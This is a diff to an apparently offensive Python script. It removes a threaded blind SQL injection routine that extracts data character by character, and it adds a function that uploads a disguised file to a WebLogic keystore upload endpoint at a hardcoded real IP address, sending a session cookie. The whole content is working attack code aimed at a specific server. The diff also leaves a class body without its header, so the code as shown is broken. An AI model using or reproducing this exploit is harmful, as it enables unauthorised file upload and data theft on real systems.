@@ -3,55 +3,20 @@ import threading
 import time
 
 
-# MapAttacker -> 
-#
-#
-#
-#
-#
-#
+def upload(rawFile):
+    url=f'http://47.74.224.5:37002/ws_utc/resources/setting/keystore?timestamp={int(time.time()*1000)}'
+    
+    file = {'id': (None, 'WU_FILE_0'), 
+         'name':  (None, f'{random.randint(1000,9999)}sf.MP4'), 
+         'type': (None, 'plan/text'),
+         'lastModifiedDate': (None, 'Sat Oct 21 2019 13:20:12 GMT+0800 (中国标准时间)'),
+         'size': (None,'1555'), 
+         'file': (f'{random.randint(1000,9999)}sf.MP4', rawFile, 'plan/text')} # 
+    headers={'Cookies':'wordpress_test_cookie=WP+Cookie+check; JSESSIONID=Mcq-T51fXGCkf7_F-mAFL-5kExiIVxL4PoLR53sXTpDjn-8xoErF!779300569'}
+    r=requests.post(url=url,files=file,headers=headers)
+    print(r.text)
 
-class MapAttackerResult:
-    index=0
-    result=''
-    def __init__(self,index,result):
-        self.index=index
-        self.result=result
-    def compare(self,cmpResult,fun=None):
-        if(fun == None):
-            fun=self.defaultFun
-        return fun(cmpResult.result,self.result)
-    def defaultFun(self,a,b):
-        return len(a)==len(b)
-class Runner(threading.Thread):
-        parent=None
-        def __init__(self,threadName,parent):
-            super(Runner,self).__init__(name = threadName)
-            self.parent=parent
-        def run(self):
-            while not self.parent.getResult():
-                time.sleep(0.1)
-class MapAttackerSingleChr:
-    #获取指定位置的值
-    def getSingleResult(self,nowPos):
-        tarUrl=self.parent.url.format(f'ord(mid({self.toFind},{nowPos},1))>{(self.low+self.high)/2}')
-        self.lock.release()
-        try:
-            tmpResponse=requests.get(tarUrl,timeout=3).text
-        except:
-            self.lock.acquire()
-            return self.getSingleResult(nowPos)
-        
-        self.lock.acquire()
-        self.nowCompleteCount+=1
-        if(self.nowCompleteCount>=len(self.ranges)):
-            self.ComsumeNowResult()
-        print(f"{index}:{tarUrl}:{str(len(tmpResponse))}")
-        self.resultList.append(MapAttackerResult(index,tmpResponse)) 
-    def __init__(self, parent,toTryPos):
-        self.toTryPos=toTryPos#获取某位
-        self.parent=parent
-class MapAttacker:
+
     lock=threading.Lock()
     
     #攻击当前的位数
